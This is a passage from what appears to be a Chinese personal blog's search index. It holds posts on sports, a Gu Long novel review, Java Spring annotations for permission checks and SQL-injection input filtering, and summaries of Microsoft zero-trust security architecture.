\n这条路对于我这种新手，就是非常的虐，但是人这种生物总是有点不正常，走的时候发誓再也不去了，结束的时候反倒还想再来一次。\n其他的路线和这两个比起来就是小打小闹了。\n骑行从小就挺喜欢骑车的，来这边后，整了辆大行P8通勤，还有一辆Trek碳车去竞速。这项运动是真烧钱，当初各种压抑自己欲望，一套下来都两个多W了，后边各种升级，一个车轮就得几K，更别说换车了，每年出来新车，就馋的流哈喇子，有些车友一辆车都十几个W，重量在八九千克，单手轻松提溜起来，时速能达到上百公里……就是真的是无底洞。\n当前刚拿到车，在小区里用了半个多小时学会了上锁，第二天就报名了一条不归路“林峰山-安顶山穿越”，全程140公里，山头也有几十个吧，许多坡陡的走路都很艰难，更别说蹬上去了……到现在都不想过于回忆这条路线，只记得两个事情，在这里达到了骑车生涯中的最高速——70km/h，感觉生死走了一趟，另外就是实现了第一摔，从这之后，下坡再也不敢野了，安全第一。\n然后过了几个月，又跟着车队骑了一次，人果然是一种不会记住历史的生物，不出意外，又是一次血虐……之后就再也不骑这条路线了（不过推荐给了好多骑友，哈哈哈）\n有一说一，浙江这地方，一年之中真正适合骑车的日子没多少，然后到处修路，加上很多事情都delay了，现在已经很少骑车了。车子在卧室旁边，每每看到都觉得对不起它，哎……\n滑雪这东西被叫做“白色鸦片”，真不是瞎说，有点上瘾，这不桐庐刚开了半个初级道，就冲了……\n单板和双板之间选择的话，比较推荐单板，可玩性很高，安全，飘逸，总结下就是帅（摔起来就很难看了），唯一的缺点大概就是入门难度比较高了。\n现在自己的单板基本就像视频里，经历了推坡、落叶飘、换刃后，S滑行还是不太连贯，花滑不会，昨天在初级坡上练了下，摔得够呛，四个小时差不多不到二十趟，腰酸背疼……\n现在自己顶多算个初级入门，能从中级道没有太多花样的情况下滑下来不摔，连续S滑行有时太快了容易摔。\n冬天来了，抓住机会多滑几次……\n羽毛球小白。（拍子持续吃灰中）\n明明可以抱教父大腿好好学一下，失去了才知道……\n后边有时间报个教练吧，打过几次感觉羽毛球挺有意思的。\n跑步跑步最大的好处应该就是不限制场地吧，然而这是我从小的弱项，一千米永远都是噩梦。\n后来通过骑行，耐力有了一点点的提升，现在勉强可以保持在4公里左右，太难了。\n这次双十一被怂恿搞了双“kayano 28”，然而再强的装备也扶不起来阿斗，emmmm\n立一个flag，三年内跑一次半马（大不了上收容车……）\n健身/撸铁\n从囚徒健身到后来健身房，三天打鱼，两天晒网的，断断续续也快10年了，当初奔着增肌长肉去的，然而这么些年过去了，体重没有一点变化，力量倒是蹭蹭的往上长，真不知道是个好事还是坏事。\n不过现在也想明白了，健身是为了啥，还不是健康，胖瘦都无所谓了。\n安全第一危险性的运动一定要保护好自己，就像昨天滑雪，虽然只是个初级道，速度也不快，但是谁能保证身后没有“人肉炸弹”呢，也许是我太谨慎了，给自己包裹的严严实实。\n运动的意义自己的身体状态真的很迷，一旦有一段时间不锻炼，整个人的状态就会很快速的下滑，没有精神，睡不醒。这种情况下强迫自己去跑几次，状态就很快恢复回来了。现在中午都会抽时间去跑一下，几公里下来，整个下午就跟打了鸡血，像之前午睡起来后只想一件事，那就是继续睡……\n焦虑这个东西，大家现在应该或多或少都会有，我有一段时间频繁失眠，然后第二天没有状态，恶性循环了老长一段时间，后来就是强迫自己去撸铁才恢复到正常状态。当高速骑行、滑行的时候，整个人的精神是高度集中在当前事物上的，可以理解为进入了运动的心流，这时脑子中的杂念都会消失的无影无踪，这个过程中真的是非常的舒服。\n其实还有一个，那就是灾难来了的时候能多一丝希望，无论是疫情、洪水还是地震、战争，当有一个好的身体，逃生起来也是有利的。\n\n\n在回来的大巴上用手机断断续续手敲的，没啥逻辑，随便看看就好。\n\n\n","categories":["胡思乱想"],"tags":["THINK"]},{"title":"通过注解/切面方式实现方法权限校验","url":"/%E9%80%9A%E8%BF%87%E6%B3%A8%E8%A7%A3%E5%88%87%E9%9D%A2%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95%E6%9D%83%E9%99%90%E6%A0%A1%E9%AA%8C/","content":"\n\nAOP是Spring的灵魂\n\n\n针对于垂直越权以及未授权访问等风险场景，用AOP来做权限校验是个不错的选择，可以使权限校验的代码逻辑更清晰和更具灵活性（就是有时候忘了加注解就很操蛋了，这时候建议在请求入口处做全局基础权限判断来兜底，此处不细讲该方案）。\n1.  创建注解创建注解，注解的作用域是METHOD。\n假设该权限校验场景下的所有API都需要登陆，那我们这里默认needLogin为true。\n@Target(&#123; ElementType.METHOD&#125;)@Retention(RetentionPolicy.RUNTIME)@Inherited@Documentedpublic @interface AutoAuth &#123;    boolean needLogin() default true;&#125;\n\n2. 实现注解的过滤逻辑接下来就要开始实现注解的权限校验逻辑了，伪代码如下：\npublic class AutoUserAuthAspect &#123;    public AuthResult checkUser(ProceedingJoinPoint pjp, AutoAuth autoAuth) throws Throwable &#123;        AuthResult result = null;        Throwable error = null;        try &#123;            Object[] args = pjp.getArgs();            if (null == args || args.length == 0) &#123;                return autoAuth.needLogin() ?                        “Need login” :                        “Error params”;            &#125;            //判断是否登陆            //获取到session/cookie\t     //解析获得userid            //判断该userid的角色            //判断角色的授权API范围            //返回权限结果 true/false       return result;\t&#125;&#125;\n\n接下来就是通过配置文件将处理逻辑关联到注解上，同时限定有效范围。\napplication-context.xml\n&lt;bean id=&quot;AutoUserAuthAspect&quot; class=“xxxxx.aspect.AutoUserAuthAspect&quot;&gt;    &lt;property name=&quot;session&quot; ref=&quot;session&quot;/&gt;&lt;/bean&gt;&lt;aop:config&gt;    &lt;aop:aspect id=&quot;autoUserAccess&quot; ref=&quot;AutoUserAuthAspect&quot;&gt;        &lt;aop:around method=&quot;checkUser&quot; pointcut=&quot;(execution(* com.xxx.xxx.xxx..*.*(..)))                   and                  (@annotation(autoAuth))”/&gt;    &lt;/aop:aspect&gt;&lt;/aop:config&gt;\n\n3. 使用注解在入参对象中，将其加到需要过滤的参数上，\n    @AutoAuth    public Result query()&#123;\t\t//业务逻辑&#125; ","categories":["安全开发"],"tags":["JAVA安全"]},{"title":"通过注解方式实现入参过滤(String类型为例)","url":"/%E9%80%9A%E8%BF%87%E6%B3%A8%E8%A7%A3%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E5%85%A5%E5%8F%82%E8%BF%87%E6%BB%A4(String%E7%B1%BB%E5%9E%8B%E4%B8%BA%E4%BE%8B)/","content":"\n\n不使用注解的SpringBoot是没有灵魂的\n\n\n在有些场景下，需要对入参进行过滤，例如sql中不能预编译的字段等，这时候可以通过写一个过滤注解，然后只需要将需注解加到想要过滤的字段上，便可以完成预想逻辑的过滤操作。\n1.  创建注解@Target(&#123; ElementType.FIELD,  ElementType.PARAMETER&#125;)\n//@Target用于设定注解使用范围\n//Target通过ElementType来指定注解可使用范围的枚举集合\n//FIELD: 可用于域上\n//PARAMETER:可用于参数上\n@Retention(RetentionPolicy.RUNTIME)\n//@Retention注解可以用来修饰其他注解，是注解的注解，称为元注解。\n//@Retention注解有一个属性value，是RetentionPolicy类型的。\n//RetentionPolicy.RUNTIME：注解不仅被保存到class文件中，JVM加载class文件之后，仍然存在\n@Constraint(validatedBy = &#123;ParamsConstraintValidator.class&#125;)\n//自定义验证注解\n这段的逻辑是CheckParams注解加工的默认类型是String，返回消息默认Param Illegal，注解的具体过滤逻辑在ParamsConstraintValidator类中\n/** * 对入参字段做sql注入风险过滤，String类型为默认配置类型 */@Target(&#123; ElementType.FIELD,  ElementType.PARAMETER&#125;)@Retention(RetentionPolicy.RUNTIME)@Constraint(validatedBy = &#123;ParamsConstraintValidator.class&#125;)public @interface CheckParams &#123;    boolean required() default true;    String message() default “Param Illegal&quot;;    /**     * type：String     * @return     */    String type() default “String&quot;;&#125;\n\n2. 实现注解的过滤逻辑自定义注解处理类必须实现ConstraintValidator接口， 其中CheckParams是自己定义的注解， 而Object是注解标注参数的类型，也可以是String或者其它类型。\ntype和message在上边已经默认配置，在添加注解时可以进行覆盖。\nSecUtil.escapeSql是过滤参数的方法，这里不细写了，任何我们想要的参数加工逻辑都可以。\npublic class ParamsConstraintValidator implements ConstraintValidator&lt;CheckParams, Object&gt; &#123;    public static final String STRING_TYPE = “String&quot;;    private String type = &quot;&quot;;    private String message =&quot;&quot;;    @Override    public void initialize(CheckParams constraintAnnotation) &#123;        ConstraintValidator.super.initialize(constraintAnnotation);        type = constraintAnnotation.type();        message = constraintAnnotation.message();    &#125;    @Override    public boolean isValid(Object o, ConstraintValidatorContext constraintValidatorContext) &#123;        if (o == null) &#123;            return true;        &#125;        constraintValidatorContext.disableDefaultConstraintViolation();        constraintValidatorContext.buildConstraintViolationWithTemplate(message).addConstraintViolation();        switch (type) &#123;            case STRING_TYPE:                 return checkString(o);            default:                return true;        &#125;    &#125;    /**     * 检验String,List&lt;String&gt;     *     * @param o     * @return     */    private boolean checkString(Object o) &#123;        if (o instanceof String) &#123;            String obj = (String)o;            String afterObj = SecUtil.escapeSql(obj);            return Objects.equals(obj, afterObj);        &#125; else if (o instanceof List) &#123;            List list = (List)o;            for (Object it : list) &#123;                if (it instanceof String) &#123;                    String obj = (String)it;                    String afterObj = SecUtil.escapeSql(obj);                    if (!Objects.equals(obj, afterObj)) &#123;                        return false;                    &#125;                &#125;            &#125;        &#125;        return true;    &#125;&#125;\n\n3. 使用注解在入参对象中，将其加到需要过滤的参数上，\n@CheckParams(message = “Param Illegal&quot;) private List&lt;String&gt; param1;@CheckParams(type = “String”, message = “Param Illegal&quot;) private String param2;","categories":["安全开发"],"tags":["JAVA安全"]},{"title":"长生剑与孔雀翎","url":"/%E9%95%BF%E7%94%9F%E5%89%91%E4%B8%8E%E5%AD%94%E9%9B%80%E7%BF%8E/","content":"\n\n长生剑\n\n天上白玉京五楼十二城仙人抚我顶结发受长生\n\n白玉京不在天上，在马上\n\n白玉京并不在天上，在马上他的马鞍已经很陈旧，他的靴子和剑鞘同样陈旧，但他的衣服却是崭新的他的剑鞘已经敲着马鞍，春风吹在他脸上他觉得很愉快，很舒服旧马鞍坐着舒服，旧靴子穿着舒服，旧剑鞘绝不会损伤他的剑锋，新衣服也总是令他觉得精神抖擞，活力充沛\n\n白玉京叹道：“一笑倾人城，再笑倾人国。再锋利的剑，只怕也比不上美人的一笑”\n\n他骄傲、任性，有时冲动得像是个孩子，有时却又深沉的像是条狐狸\n\n\n白玉京因为一个女子，卷入江湖最大黑帮的一场纷争，袁紫霞的笑是致命的，甚至比传说中的孔雀翎还要有效，孔雀翎只能杀人，而她的笑还能玩弄男人。一个行走江湖的女人，能懂得用笑来保护自己，满足自己的私欲，是任何武器和武功比不了的\n不过，江湖毕竟是江湖，公平在这是最不值钱的，没有一身铁打的功夫，没有足够的心计，又怎能保护好自己，保护好心爱的人\n所以，我想这就是古龙为什么会在最后感叹这样的一段话\n重要的是，她就在他身旁，而且永远不会再离开他。这就已够了。 　　这就是我说的第一个故事，第一种武器。 　　这故事给我们的教训是一无论多锋利的剑，也比不上那动人的一笑。所以我说的第一种武器，并不是剑，而是笑，只有笑才能真征服人心。 　　所以当你懂得这道理，就应该收起你的剑来多笑一笑！\n\n据说，古龙大叔不仅仅会写书，对于喝酒和女人也是深谙此道，这点我是相信的，没有经历过故事的人，又怎能写出这种趣味和匠心的文字\n白玉京也算是个幸运儿，令万千男儿神魂颠倒的笑容，又怎么能拒绝的了，与心爱的女人，浪迹于天涯，也算是完美的结局了\n写的很乱，也有一些很矛盾的想法，不管怎么说，这都是一部天真但却动人的小说\n在这借用网上一个读者的话\n特别是当你心情低沉，对爱情和真诚失去信心的时候，重读读「长生剑」，我知道它不够真实，但是，当我们读武侠时，岂不本来就是在希冀属于我们的童话？\n\n\n\n孔雀翎\n\n孔雀翎，是天下第一的暗器，也是天下最美的兵器，纯金打造。当然，它的美不是因为它金光灿灿，而是这些暗器发出来时，美丽的就像孔雀开屏一样，辉煌灿烂。然而，就在你被这种惊人的生灵感动得目瞪神迷时，它已经要了你的性命\n世上没有任何一种暗器比孔雀翎更可怕，也绝没有任何一种暗器能比孔雀翎更美丽没有人能形容它的美丽，也没有人能避开它、招架它\n\n在这个故事中\n武器终归是武器，再厉害也只是个引子\n高立是个杀手\n秋凤梧也是个杀手\n但他们是相互之间是唯一的朋友\n因为他们背叛了同一个组织，有着相似的品质，同时面对了死亡\n并肩面对死亡的男人，一定会成为至交\n小武笑了笑，道：”我虽然不喜欢一个人往陷阱里跳，但若有朋友陪着，随便往哪里跳那就没有关系了\n\n又是黄昏远山在夕阳中由翠绿变为青灰，泉水流到这里，也渐渐慢了\n\n双双并不是一个大众眼中的美人，瘦弱、眼盲、发育不全的畸形儿，像一个做的变了形的没人面具\n但她的脸上却没有任何自卑自怜的神色，反而充满了欢乐和自信\n小武说：“她的外貌也许并不美，可是她的心却很美，也许比世上大多数美人都美丽的多。”\n\n他们之间，不存在什么辜负不辜负，正如高立说的，“为了她这样的女人，你无论做什么都是值得的”\n当一个人有了羁绊，为了自己珍爱的东西，他不得不去战斗，他必须去扛起武器\n高立向小武借了孔雀翎，打败了敌人，却没有动用孔雀翎\n这是第二种武器\n无论多可怕的武器，也比不上人类的信心\n\n但这并不是故事的结局\n高立用行动证明了他是个有担当的的男人\n秋凤梧可以相信他的友情，他的人品，相信他会保守孔雀翎早就失落这个秘密\n但是干系太大，秋凤梧不敢赌，也不能赌\n所以，最后那杯酒\n一个人难免犯错，但是，犯了错，就必须去弥补，甚至是生命\n金开甲说\n武功本就是入世的，只要你肯用心，无论做什么事的时候，都一样可以锻炼你的武功","categories":["胡思乱想"],"tags":["THINK"]},{"title":"零信任下的用户访问","url":"/%E9%9B%B6%E4%BF%A1%E4%BB%BB%E4%B8%8B%E7%9A%84%E7%94%A8%E6%88%B7%E8%AE%BF%E9%97%AE/","content":"\n\n用户访问通常是零信任的第一要务，因为它可以迅速带来生产力优势和关键漏洞的安全覆盖\n\n\n\n使用户能够在任何地方高效工作并确保安全需要使用高质量信号明确验证用户和设备的风险/可信度。\n  \n用户风险\n衡量用户风险需要分析账户本身的风险、当前的访问请求会话，以及他们是否使用了 MFA：\n•用户/会话风险- Azure Active Directory (Azure AD) 身份保护分析用户帐户和当前访问请求，为 Azure AD 条件访问提供高/中/低风险等级。 此评级由机器学习计算确定，涉及众多个人风险因素，包括泄露的凭据、非典型旅行、恶意 IP 地址、恶意软件链接的 IP 地址和可疑的收件箱操纵规则\n•多因素身份验证 (MFA) - MFA 是合理的安全保证所必需的，因为攻击者可以（很容易）通过被盗或猜测的密码冒充受纯密码身份验证保护的帐户。\n  \n设备风险\n设备风险是通过明确验证它是否符合组织的策略来衡量的，其中可以包括验证从已安装的端点检测和响应 (EDR) 功能中未检测到恶意活动。  •IsCompliant - Microsoft Endpoint Management Intune 提供对设备安全策略的管理，该策略评估来自 Intune 托管客户端、Microsoft Defender for Endpoint 和合作伙伴 MDM 的信号\n•设备属性 - 条件访问可以过滤策略，因此它们需要特定的设备属性（例如，识别高度安全的特权访问工作站或 PAW）。\n  \n政策评估与MFA\n\nAzure AD 条件访问会根据您配置的策略评估这些信号。 静态策略和动态实时信息（威胁情报、会话上下文等）的这种组合提供了一种自适应方法来管理风险，这种方法既一致又通过不断变化的现实世界条件提供信息。  •初始访问+令牌刷新——对于所有使用条件访问的应用程序，策略验证发生在每次访问请求时+刷新令牌以延长到期时间时。\n• 安全态势的变化——此外，条件访问支持持续访问评估 (CAE)，以近乎实时地对不断变化的风险条件（例如网络位置更改、用户终止或潜在的凭据盗窃事件）提供更快的响应。\n  \n高风险的补救  \n如果用户/会话风险被评为高（表明凭据可能/已知被泄露），您可以将用户配置为自动重定向到自助服务密码重置 (SSPR) 站点以立即更改其密码。\n  \n首次集成（Microsoft 应用程序和第 3 方 VPN 和网络设备）\n\n在明确验证用户/会话和设备风险足够低后，授予访问资源的访问权限。  最初的集成通常是：\n•Microsoft 应用程序，因为这些云应用程序本身就支持 Azure AD 和条件访问。\n• 第三方 VPN 和远程访问设备 - 快速提高远程访问应用程序和网络的安全性，以实现远程和混合工作场景。 这可以快速添加复杂的用户和设备风险验证身份验证，从而降低常见的密码和设备风险。\n  \n启用您的企业资产  接下来，将扩展到跨云、移动和本地应用程序的企业应用程序的全部资产。\n  \n遗留应用程序和会话监控\nAzure AD 应用程序代理提供发布传统本地应用程序的能力，以利用这些强大的保证（并简化用户体验），帮助你超越 VPN。  Microsoft Defender for Cloud Apps（条件访问应用控制）还启用了会话监控和限制。 可以根据来自条件访问的信号和会话中的其他 MDCA 检测来监控会话并使用会话策略限制功能，包括：\n•防止数据泄露•保护下载•防止上传未标记的文件•监控用户会话以确保合规性•阻止访问•阻止自定义活动\n•较低的访问权限 - 可以使用本机应用程序功能（如下载、打印或同步文件的 SharePoint 网站限制）限制对应用程序或其中数据的访问 。\n","categories":["安全架构"],"tags":["安全建设","网络安全架构体系参考"]},{"title":"零信任原则","url":"/%E9%9B%B6%E4%BF%A1%E4%BB%BB%E5%8E%9F%E5%88%99/","content":"\n\n零信任以全新的战略视角关注最初的安全使命（使资产不受攻击者控制）\n\n\n我们运行的 IT 环境从一开始就很复杂，由许多设备、用户身份以及它们之间的交互组成\n为什么我们要尝试“零信任”策略尝试了受安全边界保护的“可信网络”随着攻击开始出现在我们的 IT 系统上，我们在 IT 安全中尝试的第一件事是从军事学说中调整安全边界的概念。 这种策略起初奏效，似乎是解决问题的一个很好的简单解决方案，因为当时大多数生产力都是在办公室的物理公司网络（台式机、服务器、大型机和终端）上完成的\n但这并没有随着时间的推移而持续随着时间的推移，生产力世界随着移动设备、WiFi、云服务和远程生产力的发展而增长。 \n与此同时，安全威胁扩展到全方位的攻击动机（犯罪、民族国家间谍活动、黑客行动主义等），并不断添加新的创造性攻击技术以始终绕过此网络边界。\n\n这两个因素削弱了所有要保护的东西都在企业网络上的基本假设， 网络安全边界策略开始无法满足组织的战略需求。\n安全需要一个全面的安全策略来指导和优先考虑如何处理这种新的复杂性（在适当的情况下结合网络安全边界），我们现在将这种策略称为零信任。\n\nMicrosoft 技术架构零信任原则指南\n明确验证\n\n使用最小特权访问\n\n假设违反\n\n\n\n有效的访问控制策略需要身份和网络控制虽然负责网络控制的团队与负责身份和相关控制（应用程序、数据、客户端/服务器）的团队之间经常存在文化冲突和困难关系，但现实是身份和安全控制对于访问控制都至关重要。 这与我们是否应该始终使用锤子或始终使用螺丝刀无关，而是要为工作选择正确的工具。\n这些技术必须协同工作才能发挥作用，发挥各自的优势，克服彼此的弱点。\n•     身份和相关控制具有丰富的上下文（用户是谁、他们的角色/属性、他们尝试使用或做什么、会话的身份验证有多强等），但仅对使用企业进行身份验证的会话有效的身份系统。\n•    网络控制可以查看和拦截更广泛的通信（尤其是遗留系统），但通常缺乏通信中通信的上下文，并且需要完全控制所有网络通信才能使控制生效。 除了一些关键场景，如运营技术 (OT) 和内部数据中心，试图为拥有远程工作、移动设备和云服务的企业保留对网络流量的完全控制是不切实际的，而且会适得其反。 试图为 SaaS 提供商重新路由所有流量的成本很高，会影响生产力，并且会通过激励用户采用未经授权和不受监控的云服务来完成他们的工作而增加整体风险。\n安全体系结构中对网络与身份和相关控制的关注程度应根据每个环境中的机会和限制进行调整：\n\n用户访问和工作效率云服务正在成为用户生产力和支持远程用户的标准，使身份和相关控制成为这些环境的重中之重。\n•     身份和相关控制应该是主要关注点，确保所有云服务和移动设备都连接到单一企业控制平面（如 Azure Active Directory），以实现对身份验证和访问的集中可见性和控制。\n•     网络控制仍然具有核心的基本过滤威胁的作用，以确保客户端端点有防火墙来阻止未经请求的流量，但除此之外，试图控制来自用户生产力设备（例如使用 VPN）的所有流量最终是一场失败的安全战斗。 网络也可用于实施精细控制，但应由零信任策略引擎而不是本地静态策略引导。\n我们建议组织将构建这种新的身份控制面（又名身份边界）作为首要任务，确保安全角色（架构师、工程师、安全运营中的分析师等）学习如何将身份和相关技术集成到架构中 、实施和日常运营。 对某些人来说，这可能是一项新技能，但它是一项需要学习的关键技能。\n操作技术（OT）和工业物联网与用户访问和生产力相比，OT 和 IoT 环境的比例相反。 这些环境由可能有 50-100 年历史的物理机械（在某些情况下由蒸汽驱动）组成，在过去 30-50 年中经常使用电子计算机控制进行改造。 这些计算机控件中的大多数现在都支持 IP 网络通信，但许多都是依靠设备将自定义或行业特定协议转换为 IP 流量来实现的。 这些系统通常（从 IT 角度来看）陈旧且过时，执行“基本”IT 安全功能（例如扫描网络以查找漏洞）很容易导致代价高昂的中断。 经常听到这样的故事，比如安全扫描导致关键设备失效，并要求技术人员驾驶数百英里来重新启动连接到远程设备的 PC。\n网络控制——由于这些限制，安全必须关注他们能做什么，这通常是：\n•     使用防火墙和其他网络控制将这些环境与企业 IT 环境隔离开来\n•     被动监控流量，以识别异常活动和漏洞。\n身份及相关——使用现代云时代身份协议（如 OAuth/ODIC 或 SAML）作为主要控制通常甚至不是一个微弱的希望。 身份和相关控制的作用主要是保护 IT 环境中连接这些环境的暴露点，例如 确保将 IT 最佳实践严格应用于与 OT 系统交互的 IT 系统（强大的多因素身份验证、快速修补等）\n数据中心安全数据中心环境需要更多地混合两种类型的控制。 大多数托管应用程序和数据的数据中心都采用了多种控制组合：\n•    网络 - 防火墙、IDS/IPS 和其他控制措施，以防止未经请求的互联网流量。 这有时会扩展到网段以分隔应用程序/工作负载或应用程序层（数据库、应用程序和演示），但由于应用程序间通信的复杂性，这是一项具有挑战性/高级的练习。\n•     身份和相关——大多数数据中心操作系统和应用程序结合使用Active Directory、身份系统和其他管理工具来提供对这些系统的访问控制。 有时，详细的基于角色的访问控制 (RBAC) 或基于属性的访问控制 (ABAC) 用于单个工作负载和应用程序，但这通常因工作负载而异。\n随着数据中心工作负载迁移到云端（以及软件定义的数据中心方法），使用 Azure 网络安全组 (NSG)、应用程序安全组 (ASG) 和 Azure 防火墙等技术可以更轻松地实施基本网络控制。\n更重要的是，使用 Azure 资源的托管身份等技术，身份控制变得更容易实施和集成。 这些提供了基于身份的访问控制的丰富上下文，而无需管理凭证的负担，并且通常可以在不需要开发人员更改应用程序的情况下实施。这促使人们越来越关注数据中心内的身份，从而提高了安全架构的可见性和控制粒度。\n安全运营安全运营部门监视并响应这些环境中的事件，因此他们需要熟悉每个组织中的网络和身份控制。\n","categories":["安全架构"],"tags":["安全建设","网络安全架构体系参考"]},{"title":"零信任原则下的安全现代化「Microsoft」","url":"/%E9%9B%B6%E4%BF%A1%E4%BB%BB%E5%8E%9F%E5%88%99%E4%B8%8B%E7%9A%84%E5%AE%89%E5%85%A8%E7%8E%B0%E4%BB%A3%E5%8C%96%E3%80%8CMicrosoft%E3%80%8D/","content":"#安全架构  网络安全架构体系参考——零信任原则下的安全现代化「Microsoft」\n\n\n这一张图里干货满满，拆解开来学习下现代化的网络安全架构体系\n\n\n\n从服务器和网络开始现在的大多数组织都在运行着多平台环境，使用 Windows 和 Linux 服务器，在上面运行着数据中心、容器和要保护的许多不同类型、版本的应用程序。 因此大多数组织会从网络边缘/出口点部署核心安全功能（NGFW、Edge DLP、IPS/IDS、Proxy），以保护生产网和内网的资产。\n\n…和端点和设备许多组织利用系统内置的 Windows 功能和系统管理来提供基本的安全保障，例如打补丁和 Active Directory 帐户安全和组策略等\n•Microsoft Endpoint Manager (MEM) 配置管理器和 Intune MDM/MAM 提供跨平台的统一端点管理 (UEM) 和跨Windows、Linux、Mac、iOS 和 Android 的安全性•Windows 10 安全包括一套广泛的平台功能和硬件安全集成，以防止不断演变的攻击\n\n\nSaaS 推动身份和访问安全的现代化组织首先开始采用SaaS云服务，第一个app通常是用于电子邮件的 Office 365（或者G Suite）\n这就需要使用安全的云身份（也延伸到企业资产的移动/物联网部分）在防火墙之外进行访问控制。随着数据中心上云的现代化趋势，身份在数据中心访问控制策略中也扮演着越来越重要的角色。\n虽然有些人没有意识到这一点，但许多组织已经使用 Azure Active Directory 在其企业资产中部署了现代单一身份和单一登录功能（在 Office 365 部署期间配置并通过 Active Directory 连接到现有企业身份系统）\n除了单点登录 (SSO) 之外，Microsoft 还为 Azure AD 提供了关键的现代安全元素，例如：\n•    无密码和 MFA – 通过 Hello For Business 生物特征认证、Authenticator App（适用于任何现代手机）和 FIDO2 密钥简化用户体验和加强安全保证的能力•    身份保护——通过泄露凭证保护、行为分析、威胁情报集成等来抵御高度流行的攻击•    Azure AD PIM 通过使用审批工作流提供对特权帐户的及时访问来降低风险•    身份治理有助于确保正确的人能够访问正确的资源•    Azure AD B2B 和 B2C 为合作伙伴和客户/客户/公民帐户提供安全性，同时将它们与企业用户目录分开\n此外，条件访问通过显式验证请求访问您的资源的用户和端点的信任，将零信任原则应用于访问控制决策。这有助于通过现代控制围绕这些现代资源构建事实上的安全边界，并在它们之间提供简单一致的策略实施。\n服务信任门户提供有关 Microsoft 如何保护我们的云平台并报告合规性的信息。\n\n\nAzure AD 应用代理Azure AD 应用代理通过简化用户对本地资源的访问并通过条件访问（明确验证用户和设备信任，零信任原则）实现安全性，将现代访问控制方法（安全边界）扩展到本地资源。\n\n数据中心成为跨多个云（IaaS、PaaS）和本地的混合基础架构大多数组织已扩展到混合基础架构，该基础架构跨越本地和一个或多个云，提供基础架构即服务 (IaaS) 和/或平台即服务 (PaaS) 功能。\n在 Azure 上，微软对 Azure Marketplace 进行了投资，以确保客户能够访问流行供应商的功能，客户通常使用这些功能将现有的本地控制扩展到云。\nMicrosoft 为 Azure 服务提供专用链接支持，以帮助组织将专用网络扩展到应用程序使用的 PaaS 服务。 虽然这将当前的控制和实践扩展到云，但私有网络可能不足以缓解现代攻击，因此 Microsoft 建议遵循零信任原则 (https://aka.ms/zerotrust) 使用身份、网络、 应用程序、数据和其他控件。\n\n多云和 Azure 安全性Microsoft 已投资于广泛的功能，以帮助保护混合多云环境及其中的工作负载。这些内置在 Azure 中，并且有几个使用 Azure Arc 扩展到您的混合基础架构资产（本地、AWS、GCP 和其他云）。\nAzure Lighthouse 在 Azure 中为服务提供跨租户支持，通常由托管服务提供商和拥有多个租户的客户使用。\n•    Microsoft Defender for Cloud 为管理 Azure（以及跨 IaaS 和 PaaS 云）中的安全性和合规性提供了一个单一起点，包括•    Secure Score 来衡量安全状况并提供优先指导以改进它，例如•    管理帐户不需要多重身份验证•    直接暴露在互联网上的虚拟机•     Web 应用程序缺少 Web 应用程序防火墙 (WAF)•     过时的补丁和反恶意软件签名•    …和许多其它的•    Compliance Dashboard 帮助您快速查看和报告合规状态以及监管指导（并快速提高您的合规性）•    Azure 防火墙是一种托管的、基于云的网络安全服务，可帮助保护您的 Azure 虚拟网络资源。•    Azure Firewall Premium（预览版）是下一代防火墙，具有高度敏感和受监管的环境（TLS 检查、IDPS、URL 过滤、Web 类别）所需的功能。•    Azure Firewall Manager 是一项安全管理服务，可为基于云的安全边界提供中央安全策略和路由管理。•    Azure Web 应用程序防火墙 (WAF) 为您的 Web 应用程序提供集中保护，使其免受常见攻击和漏洞的影响。\n微软还在其他 Azure 安全功能上投入巨资，例如分布式拒绝服务 (DDoS) 缓解措施、密钥管理、用于保护远程访问的 Azure Bastion、Azure Backup 中的防勒索软件备份存档、在处理数据时保护数据的机密计算功能， 还有很多。\n\n数据中心和运营技术 (OT) 的威胁监控Microsoft 威胁情报 – 在我们的正常运营过程中，Microsoft 每天处理超过 24 万亿个上下文信号，我们使用这些信号生成威胁情报，以保护我们的云服务、IT 环境和客户。此架构中的许多功能将威胁情报直接集成到威胁检测、安全指导等中。\nMicrosoft Defender for Cloud 为跨混合资产的基础结构以及运营技术 (OT) 提供扩展的检测和响应 (XDR) 功能。 XDR 工具旨在通过提供对特定资产类型的深入可见性以及增强的检测、响应和恢复功能（尤其是具有低误报率的高质量警报）来补充安全信息和事件管理 (SIEM)。\n•    Microsoft Defender for Cloud 目前涵盖最常用的基础架构服务，包括服务器/VM、存储、数据库、DNS、应用服务、Kubernetes、容器注册表、密钥保管库和资源管理器。•    Microsoft Defender for IoT 使用无代理方法帮助保护控制物理过程的 OT 系统，例如监督控制和数据采集 (SCADA) 和工业控制系统 (ICS)。此外，此功能还通过支持标准物联网操作系统（如 Linux 和 RTOS）的轻量级微代理来保护物联网设备。\n\n\n安全运营/SOC为了帮助安全运营团队管理主动攻击，Microsoft 投资了 XDR 和 SIEM 的双重策略。\nMicrosoft Sentinel 是一种云原生 SIEM，可提供对整个资产（IT、OT、IoT）的广泛可见性，而 XDR 功能可提供对特定资产的深入可见性，以帮助快速调查和修复（端点、电子邮件和 Office 365、身份、SaaS、Azure和多云基础架构）\n•     Microsoft Defender for Endpoint (MDE) – 提供高级端点检测和响应 (EDR) 功能、Web 内容过滤、威胁和漏洞管理以及数据丢失保护 (DLP)。与云应用程序一样，Microsoft 将其与我们产品组合中的其他功能集成在一起，因此您无需运行多个代理/解决方案即可实现端点安全目标。\nMicrosoft 专注于减少分析师的疲劳并实现对事件的快速有效响应，并专注于\n•     安全编排、自动化和补救 (SOAR) 技术以及将工具集集成在一起（本机和通过提供 API）的无缝体验。•    使用机器学习 (ML) 和行为分析 (UEBA) 快速准确地分析异常情况\nMicrosoft 还为我们的客户提供人类专业知识，包括\n•    Microsoft Threat Experts – Microsoft 365 Defender 中内置的托管搜寻服务，具有专家级监控和分析功能，可帮助确保您的独特环境中的关键威胁不会被遗漏。•    检测和响应团队 (DART) – 和相关团队提供专业服务，帮助调查您环境中的事件并寻找潜在的现有威胁•    MSSP/MDR 提供商– Microsoft 与业内顶级专家合作，在这些功能上建立他们的专业知识，以便他们可以为我们的客户提供建议和直接支持。\n此外，Microsoft Defender for Cloud Apps (MDCA) 提供云访问安全代理 (CASB) 功能，为 SaaS 应用程序提供 XDR，并为这些 SaaS 应用程序和存储在其中的数据提供治理、威胁保护、数据保护等。 MDCA 与 Microsoft 产品组合中的其他功能集成，以将其扩展到 SaaS 